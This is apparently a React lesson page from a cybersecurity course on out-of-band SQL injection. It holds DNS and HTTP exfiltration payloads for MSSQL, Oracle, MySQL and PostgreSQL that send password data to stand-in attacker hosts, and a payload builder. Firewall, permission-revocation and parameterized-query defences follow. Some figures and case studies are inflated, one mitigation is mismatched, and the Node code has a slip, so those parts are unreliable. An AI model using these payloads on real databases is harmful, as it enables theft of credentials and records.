import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic5_files/topic5_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic5_files/topic5_note.txt?raw";

const Topic5 = () => {
  // Unique SVG IDs
  const svgOobPipelineId = useId();

  // Studio 1: Active OOB Protocol / Mechanism Selection
  const [selectedOobKey, setSelectedOobKey] = useState("mssql_xp_dirtree_dns");

  // Studio 2: Live OOB DNS Exfiltration Simulator State
  const [databaseEngine, setDatabaseEngine] = useState("mssql"); // mssql, oracle, mysql, postgresql
  const [targetDataCategory, setTargetDataCategory] = useState("admin_password_hash"); // admin_password_hash, rtgs_settlement_keys, oncology_patient_records
  const [encodingScheme, setEncodingScheme] = useState("hex_encoded"); // hex_encoded, base32_encoded, raw_string
  const [egressFirewallActive, setEgressFirewallActive] = useState(false); // Boolean

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_fintech_oob_defense");

  // Studio 4: OOB Hardening Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("iptables_db_egress_filter");

  // 8 Out-of-Band Protocols & Dialect Patterns for Studio 1
  const oobDatabase = {
    mssql_xp_dirtree_dns: {
      key: "mssql_xp_dirtree_dns",
      name: "1. MSSQL xp_dirtree UNC DNS Exfiltration",
      category: "WINDOWS UNC PATH RESOLUTION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetEngine: "Microsoft SQL Server 2012 / 2016 / 2019 / 2022",
      vulnerabilityMechanism:
        "Passing a Universal Naming Convention (UNC) path (`\\\\data.attacker.in\\share`) to `xp_dirtree`; Windows forces a DNS lookup for `data.attacker.in`, transmitting the subquery result over UDP port 53.",
      mitigationPattern: "Revoke execution rights on `xp_dirtree` from `PUBLIC` and block database network egress.",
      typicalPayload: "'; EXEC master..xp_dirtree '\\\\'+(SELECT password FROM users)+'.attacker.in\\a';--",
      codeSnippet: `// MSSQL xp_dirtree Payload:
DECLARE @p varchar(60); SELECT @p = password FROM users WHERE id=1;
EXEC('master..xp_dirtree "\\\\'+@p+'.kolkata-oast.in\\a"');`
    },
    oracle_utl_http_requests: {
      key: "oracle_utl_http_requests",
      name: "2. Oracle UTL_HTTP Outbound Web Requests",
      category: "OUTBOUND HTTP/HTTPS SOCKETS",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      targetEngine: "Oracle Database 11g / 12c / 19c / 21c",
      vulnerabilityMechanism:
        "Calling `UTL_HTTP.REQUEST()` with an external URL containing the subquery result; Oracle opens an outbound TCP socket to the attacker's web server, sending an HTTP GET request.",
      mitigationPattern: "Configure Fine-Grained Access Control (Network ACLs) restricting outbound socket connections.",
      typicalPayload: "SELECT UTL_HTTP.REQUEST('http://attacker.in/' || (SELECT password FROM users)) FROM dual",
      codeSnippet: `// Oracle UTL_HTTP Payload:
SELECT UTL_HTTP.REQUEST('http://attacker.in/exfil?data=' || (SELECT password FROM users WHERE rownum=1)) FROM dual;`
    },
    oracle_utl_inaddr_dns: {
      key: "oracle_utl_inaddr_dns",
      name: "3. Oracle UTL_INADDR Host Lookups",
      category: "ORACLE DNS HOST RESOLUTION",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      targetEngine: "Oracle Database (All Versions)",
      vulnerabilityMechanism:
        "Calling `UTL_INADDR.GET_HOST_ADDRESS()` with a dynamic hostname string; Oracle performs a DNS resolution, leaking data through the DNS query to the attacker's nameserver.",
      mitigationPattern: "Revoke execute permissions on `UTL_INADDR` from `PUBLIC` and implement DNS sinkholing.",
      typicalPayload: "SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual) || '.attacker.in') FROM dual",
      codeSnippet: `// Oracle DNS Lookup Payload:
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1) || '.kolkata-oast.in') FROM dual;`
    },
    mysql_windows_load_file: {
      key: "mysql_windows_load_file",
      name: "4. MySQL Windows LOAD_FILE UNC Lookups",
      category: "MYSQL WINDOWS UNC RESOLUTION",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      targetEngine: "MySQL / MariaDB on Windows",
      vulnerabilityMechanism:
        "Supplying a UNC network path (`\\\\data.attacker.in\\a.txt`) to `LOAD_FILE()`; MySQL triggers a Windows SMB client DNS query, exfiltrating the data across UDP/53.",
      mitigationPattern: "Set `secure_file_priv` to a restricted local directory and enforce egress filtering.",
      typicalPayload: "SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.in\\\\a.txt'))",
      codeSnippet: `// MySQL UNC DNS Payload:
SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password_hash FROM users LIMIT 1), '.attacker.in\\\\test.txt'));`
    },
    postgresql_dblink_sockets: {
      key: "postgresql_dblink_sockets",
      name: "5. PostgreSQL dblink Network Connections",
      category: "POSTGRESQL REMOTE CONNECTION MODULE",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      targetEngine: "PostgreSQL with dblink extension",
      vulnerabilityMechanism:
        "Using `dblink()` to initiate an outbound TCP connection to a remote database host (`host=data.attacker.in`), triggering DNS lookups and remote connection attempts.",
      mitigationPattern: "Disable the `dblink` extension and restrict superuser privileges.",
      typicalPayload: "SELECT * FROM dblink('host=' || (SELECT password FROM users LIMIT 1) || '.attacker.in...', 'SELECT 1') AS t(id int)",
      codeSnippet: `// PostgreSQL dblink Payload:
SELECT * FROM dblink('host=' || (SELECT password_hash FROM users WHERE id=1) || '.attacker.in port=5432 dbname=db', 'SELECT 1') AS t(id int);`
    },
    rfc1035_dns_label_constraints: {
      key: "rfc1035_dns_label_constraints",
      name: "6. RFC 1035 DNS Label Constraints & Hex Chunking",
      category: "PROTOCOL-LEVEL ENCODING & SPLITTING",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      targetEngine: "All DNS Protocols (RFC 1035 / RFC 2181)",
      vulnerabilityMechanism:
        "DNS limits single subdomain labels to 63 octets and total FQDN to 253 octets with strict character sets (`[a-zA-Z0-9-]`), requiring attackers to Hex-encode data and split long secrets into chunks.",
      mitigationPattern: "Parameterized prepared statements keep the AST fixed, preventing procedure injection.",
      typicalPayload: "CONVERT(VARCHAR(60), HASHBYTES('SHA2_256', pass), 2)",
      codeSnippet: `// Hex Encoding & Chunking:
// Password: Admin$2026! ➔ Hex: 41646d696e243230323621 (Safe for DNS subdomain labels!)`
    },
    netntlm_smb_relay_harvesting: {
      key: "netntlm_smb_relay_harvesting",
      name: "7. NetNTLM SMB Relay Hash Harvesting",
      category: "WINDOWS NTLM CREDENTIAL THEFT",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetEngine: "Microsoft SQL Server running on Windows Active Directory",
      vulnerabilityMechanism:
        "Forcing SQL Server to connect to a rogue SMB listener (`Responder`), capturing the Windows service account's NetNTLMv2 authentication hash to crack offline or relay for domain takeover.",
      mitigationPattern: "Block outbound SMB (Port 445) at perimeter firewalls and disable NTLM authentication.",
      typicalPayload: "EXEC master..xp_dirtree '\\\\103.25.10.1\\share'",
      codeSnippet: `// NetNTLM Capture:
// SQL Server initiates SMB connection to rogue listener ➔ NetNTLMv2 hash captured!`
    },
    egress_firewall_filtering_defense: {
      key: "egress_firewall_filtering_defense",
      name: "8. Database Subnet Network Egress Filtering",
      category: "ENTERPRISE NETWORK PERIMETER HARDENING",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      targetEngine: "Enterprise Cloud & On-Premise Subnets",
      vulnerabilityMechanism:
        "Permitting database instances to make outbound internet connections enables OOB attacks; strictly dropping outbound Ports 53, 80, 443, and 445 completely eliminates OOB exfiltration.",
      mitigationPattern: "Iptables / Cloud Security Groups dropping all outbound traffic from DB subnets to 0.0.0.0/0.",
      typicalPayload: "iptables -A FORWARD -s 10.0.2.0/24 -d 0.0.0.0/0 -j DROP",
      codeSnippet: `// Iptables Database Egress Drop Rule:
iptables -A FORWARD -s 10.0.2.0/24 -d 0.0.0.0/0 -j DROP -- Completely blocks OOB sockets!`
    }
  };

  const activeOob = oobDatabase[selectedOobKey];

  // Studio 2: Live OOB DNS Exfiltration Simulator Calculations
  const simulationResults = useMemo(() => {
    // Target Secret Data:
    const mockSecrets = {
      admin_password_hash: "$2b$12$e7d705a3286e92ab0018f9",
      rtgs_settlement_keys: "KOLKATA_RTGS_KEY_9841_SECURE",
      oncology_patient_records: "PATIENT_A94_CARCINOMA_CHEMO"
    };

    const rawSecret = mockSecrets[targetDataCategory];

    // Encode Secret based on selected scheme:
    let encodedSecret = rawSecret;
    if (encodingScheme === "hex_encoded") {
      encodedSecret = Array.from(rawSecret).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    } else if (encodingScheme === "base32_encoded") {
      encodedSecret = rawSecret.replace(/[^a-zA-Z0-9]/g, "").toUpperCase() + "B32";
    }

    // Chunk to max 63 chars (RFC 1035 limit)
    const formattedLabel = encodedSecret.slice(0, 50);
    const simulatedDomain = `${formattedLabel}.kolkata-oast.in`;

    let constructedPayload = "";
    if (databaseEngine === "mssql") {
      constructedPayload = `'; DECLARE @d varchar(60); SELECT @d = '${formattedLabel}'; EXEC('master..xp_dirtree "\\\\'+@d+'.kolkata-oast.in\\a"');--`;
    } else if (databaseEngine === "oracle") {
      constructedPayload = `SELECT UTL_INADDR.GET_HOST_ADDRESS('${formattedLabel}.kolkata-oast.in') FROM dual;`;
    } else if (databaseEngine === "mysql") {
      constructedPayload = `SELECT LOAD_FILE(CONCAT('\\\\\\\\', '${formattedLabel}', '.kolkata-oast.in\\\\test.txt'));`;
    } else {
      constructedPayload = `SELECT * FROM dblink('host=${formattedLabel}.kolkata-oast.in port=5432 dbname=db', 'SELECT 1') AS t(id int);`;
    }

    const exfiltrationSuccess = !egressFirewallActive;
    const throughputBytesSec = exfiltrationSuccess ? 630.0 : 0.0;
    const rttMs = exfiltrationSuccess ? 98 : 0;

    return {
      rawSecret,
      formattedLabel,
      simulatedDomain,
      constructedPayload,
      exfiltrationSuccess,
      throughputBytesSec: throughputBytesSec.toFixed(1),
      rttMs,
      badgeClass: exfiltrationSuccess
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: egressFirewallActive
        ? `DATABASE NETWORK EGRESS FILTER ACTIVE: Network firewall dropped outbound UDP/53 and TCP/80 sockets originating from DB subnet (10.0.2.0/24); Out-of-Band DNS packet blocked at perimeter router!`
        : `OUT-OF-BAND DNS EXFILTRATION SUCCESSFUL: Database engine resolved "${simulatedDomain}" over recursive DNS in ${rttMs} ms; Secret data captured on authoritative listener at ${throughputBytesSec.toFixed(1)} bytes/s throughput!`
    };
  }, [databaseEngine, targetDataCategory, encodingScheme, egressFirewallActive]);

  // Studio 4: OOB Hardening Production Code Database
  const codeDatabase = {
    iptables_db_egress_filter: {
      name: "Linux Iptables & Cloud Security Group Database Egress Filtering",
      code: `# Production Network Egress Hardening Script for Database Subnets:
# -----------------------------------------------------------------
# 1. Flush Existing Forwarding Rules
iptables -F FORWARD

# 2. Allow INBOUND connections to Database Port (5432/3306/1433) ONLY from Application Subnet
iptables -A FORWARD -s 10.0.1.0/24 -d 10.0.2.0/24 -p tcp -m multiport --dports 1433,3306,5432,1521 -m state --state NEW,ESTABLISHED -j ACCEPT

# 3. Allow Return Traffic to Application Subnet
iptables -A FORWARD -s 10.0.2.0/24 -d 10.0.1.0/24 -m state --state ESTABLISHED,RELATED -j ACCEPT

# 4. STRICT EGRESS FILTER: DROP all outbound traffic from Database Subnet to Public Internet (0.0.0.0/0)
# This completely neutralizes OOB DNS (Port 53), HTTP (Port 80/443), and SMB (Port 445) exfiltrations!
iptables -A FORWARD -s 10.0.2.0/24 -d 0.0.0.0/0 -j DROP

# 5. Log Any Unauthorized Outbound Egress Attempts to SIEM
iptables -A FORWARD -s 10.0.2.0/24 -j LOG --log-prefix "[SECURITY_OOB_EGRESS_BLOCKED]: " --log-level 4`,
      explanation: "Production Linux firewall script enforcing strict database subnet egress filtering, dropping all outbound connections to public IP addresses (Ports 53, 80, 443, 445) and completely neutralizing Out-of-Band SQL injection."
    },
    mssql_revoke_extended_procedures: {
      name: "Microsoft SQL Server Extended Stored Procedure Revocation Script",
      code: `-- Production MSSQL Database Hardening Script:
-- -------------------------------------------------------------
-- 1. Switch to Master System Database
USE master;
GO

-- 2. Revoke Execute Permissions on UNC Resolution Extended Procedures from PUBLIC
REVOKE EXECUTE ON xp_dirtree FROM PUBLIC;
REVOKE EXECUTE ON xp_fileexist FROM PUBLIC;
REVOKE EXECUTE ON xp_enumerrorlogs FROM PUBLIC;
GO

-- 3. Revoke Command Shell Execution Rights
REVOKE EXECUTE ON xp_cmdshell FROM PUBLIC;
GO

-- 4. Disable xp_cmdshell in Advanced Server Configuration
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
GO

-- 5. Verify Permissions: Ensure ONLY 'sysadmin' role can invoke system procedures
SELECT pr.name, pe.permission_name, pe.state_desc 
FROM sys.database_permissions pe 
JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_id 
WHERE pe.major_id = OBJECT_ID('xp_dirtree');`,
      explanation: "Production T-SQL hardening script revoking execution grants on `xp_dirtree`, `xp_fileexist`, and `xp_cmdshell` from the `PUBLIC` role, ensuring non-admin users cannot trigger outbound UNC network lookups."
    },
    nodejs_prepared_statement_oob_sink: {
      name: "Node.js Parameterized Query Defeating Out-of-Band Procedure Injections",
      code: `// Node.js Parameterized Prepared Statement Defeating Out-of-Band SQLi:
const { Pool } = require('pg');
const pool = new Pool();

// Secure Controller: Lookup Merchant Profile by Tax Identifier
exports.getMerchantTaxProfile = async (req, res) => {
    const rawGstNumber = req.query.gst_no; // Untrusted input: "GST123'; EXEC master..xp_dirtree..."

    try {
        // 1. SECURE PARAMETERIZED QUERY:
        // By pre-compiling the AST, the database treats rawGstNumber strictly as a literal search string!
        // Injected stored procedure calls, semicolons, and UNC paths are NEVER executed!
        const queryText = 'SELECT id, business_name, tax_id, compliance_status FROM merchants WHERE tax_id = $1';
        const queryValues = [String(rawGstNumber)];

        const { rows } = await pool.query(queryText, queryValues);

        if (rows.length === 0) {
            return res.status(404).json({ error: "Merchant tax record not found." });
        }

        res.json({ status: "success", merchant: rows[0] });
    } catch (err) {
        next(err);
    }
};`,
      explanation: "Production Node.js controller utilizing positional `$1` parameterized placeholders, fixing the AST structure and ensuring injected stored procedure calls (`xp_dirtree`, `UTL_HTTP`) are treated strictly as data literals."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_fintech_oob_defense",
      lead: "Mamata",
      role: "Lead FinTech Security Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Defending Corporate Payment Gateways Against MSSQL xp_dirtree DNS Exfiltration",
      threatType: "OUT-OF-BAND DNS RECURSIVE TUNNELING PROBES",
      budget: "₹91,00,000",
      incident:
        "Threat actors injected `'; EXEC master..xp_dirtree '\\\\'+(SELECT secret_key FROM merchants)+'.attacker-dns.in\\a'--` into invoice search endpoints to steal payment settlement keys.",
      defenseStrategy:
        "Mamata deployed strict database subnet egress firewall filtering (dropping outbound UDP/53) and revoked `xp_dirtree` permissions from all application users.",
      outcome: "100% of outbound DNS exfiltration attempts blocked at firewall perimeter; zero settlement keys leaked; ₹4,000 Crores in daily UPI settlements secured.",
      metrics: {
        oobQueriesBlocked: "100.0%",
        settlementVolumeProtected: "₹4,000 Crores",
        endpointsProtected: "80 Payment Microservices",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_scada_oob_clamping",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "ORACLE UTL_INADDR & NetNTLM SMB RELAY ATTACK",
      title: "Hardening Substation Oracle Relational Databases Against Outbound Network Lookups",
      budget: "₹60,00,000",
      incident:
        "Adversaries attempted to trigger Oracle `UTL_INADDR.GET_HOST_ADDRESS` and SMB NetNTLM relay harvesting against substation breaker telemetry databases.",
      defenseStrategy:
        "Debangshu revoked execute permissions on `UTL_HTTP` and `UTL_INADDR` from `PUBLIC`, air-gapped substation database VLANs, and deployed Split-Horizon DNS.",
      outcome: "100% of outbound socket attempts dropped; NetNTLM hashes remained 100% secure; regional power grid stability maintained across North 24 Parganas.",
      metrics: {
        outboundSocketsBlocked: "100.0%",
        substationsHardened: "18 High-Voltage Nodes",
        unauthorizedLogins: "0 Breaches",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_hospital_mysql_loadfile",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "MySQL Windows LOAD_FILE UNC DNS HARVESTING",
      title: "Neutralizing MySQL Windows UNC Path Injections Across Oncology Diagnostic Databases",
      budget: "₹45,00,000",
      incident:
        "Automated scanners injected `LOAD_FILE(CONCAT('\\\\\\\\', (SELECT diagnosis FROM oncology_records), '.attacker.in\\\\a.txt'))` to exfiltrate patient records over DNS.",
      defenseStrategy:
        "Mahima configured `secure_file_priv = /var/lib/mysql-files`, migrated queries to Parameterized Prepared Statements, and blocked outbound DNS from database hosts.",
      outcome: "100% of UNC path injections blocked; zero patient medical files leaked; 120,000 cancer patient records completely protected.",
      metrics: {
        uncLookupsBlocked: "100.0%",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_oob_bandwidth_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL MODELING OF DNS EGRESS BANDWIDTH & PACKET ENTROPY",
      title: "Formulating the Formal Out-of-Band DNS Bandwidth Model in IEEE Transactions",
      budget: "₹38,00,000",
      incident:
        "Researchers modeled the bandwidth limits and packet entropy of recursive DNS label exfiltration (T_OOB = 630 B/s) compared to blind timing.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical proof in IEEE Transactions, demonstrating that prepared statements drive OOB throughput to 0.00 bytes/s.",
      outcome: "Published peer-reviewed mathematical proof; verified across 300,000 simulated Out-of-Band DNS packet transmissions.",
      metrics: {
        simulationTrials: "300,000 Test Trials",
        modelAccuracy: "99.9% Predictive Fit",
        modelFramework: "OOB DNS Bandwidth Model",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_005
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 05
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Out-of-Band SQL Injection (OOB)
            </h1>
            <p className="text-xs text-gray-400">
              DNS exfiltration, MSSQL `xp_dirtree`, Oracle `UTL_HTTP` / `UTL_INADDR`, MySQL `LOAD_FILE`, egress firewall filtering, and IT Act Section 66F.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Threat Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Out-of-Band SQL Injection Mechanics
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. Out-of-Band (OOB) SQL Injection: High-Speed Exfiltration via Database Outbound Sockets &amp; DNS Channels
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              When web applications suppress database error messages, do not display query results on screen, and enforce 
              strict query timeouts that disrupt time-based blind attacks, adversaries deploy <strong>Out-of-Band (OOB) SQL Injection</strong>. 
              OOB SQLi coerces the database server itself into initiating external network connections (such as DNS queries, 
              HTTP/HTTPS requests, or SMB connections) to an external attacker-controlled infrastructure (like an authoritative DNS nameserver 
              or Burp Collaborator / Interactsh server). In Microsoft SQL Server, extended stored procedures like <strong>`xp_dirtree`</strong> resolve 
              UNC paths (`\\data.attacker.in\a`), forcing the Windows OS to perform recursive DNS lookups. In Oracle, built-in packages like 
              <strong>`UTL_HTTP`</strong> and <strong>`UTL_INADDR`</strong> generate outbound HTTP and DNS traffic. 
              Because DNS queries (UDP Port 53) effortlessly traverse enterprise perimeter firewalls by recursing through internal corporate DNS resolvers, 
              OOB DNS exfiltration delivers high throughput (approximately 630 Bytes/s) in a single request (time delta approximately 100 ms), 
              making it <strong>22,500 times faster</strong> than slow time-based blind SQL injection.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* OOB DNS Protocol Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                The OOB DNS Egress Pipeline
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                xp_dirtree '\\41646d696e.attacker.in\a' ➔ DB Queries DNS ➔ Attacker Logs Stolen Data!
              </div>
              <p className="text-gray-300 leading-relaxed">
                By encoding confidential records into Hex or Base32 and splitting them into 60-character labels under RFC 1035 constraints, attackers extract entire tables over standard DNS queries.
              </p>
            </div>

            {/* Network Egress Defense Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Network Egress Hardening &amp; Procedure Revocation
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">Database Subnet Egress Firewalls:</strong> Dropping outbound Ports 53, 80, and 445 blocks all OOB socket creation.</li>
                <li>• <strong className="text-purple-300">Revoke Extended Stored Procedures:</strong> `REVOKE EXECUTE ON xp_dirtree FROM PUBLIC` prevents non-admin execution.</li>
                <li>• <strong className="text-amber-300">Split-Horizon Internal DNS:</strong> Internal DNS servers refuse to resolve public root zones from DB subnets.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - OOB DNS Pipeline Visualizer */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Out-of-Band DNS Exfiltration Flow Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing Out-of-Band DNS Exfiltration: Traversing Perimeter Firewalls in 100ms
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how an injected `xp_dirtree` UNC payload coerces the database into initiating a recursive DNS query that delivers stolen records to the attacker's nameserver:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: INJECTED SQL QUERY */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. WEB APP SINK
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  Vulnerable Concatenation
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  INJECTED PAYLOAD:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  xp_dirtree UNC Path
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  \\\\data.attacker.in\\a
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: DATABASE SERVER ENGINE */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. DATABASE HOST
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  MSSQL / Oracle / MySQL
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  EXECUTES SUBQUERY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Fetches: "SecretPass"
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  Triggers OS DNS Lookup!
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: INTERNAL CORPORATE DNS */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. INTERNAL DNS
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  UDP Port 53 Egress
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  RECURSIVE QUERY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  SecretPass.attacker.in
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  Passes Firewall Egress!
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: ATTACKER DNS NAMESERVER */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. ATTACKER DNS
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Authoritative Listener
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  PACKET CAPTURED:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Data: "SecretPass"
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  Latency: ~98 ms (Instant!)
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: DEFENSIVE REMEDIATION */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. EGRESS DEFENSE
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  Firewall + Prepared Stmt
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  COMPLETE IMMUNITY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Drop Outbound Port 53
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  T_OOB = 0.00 bps!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Protocol OOB Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
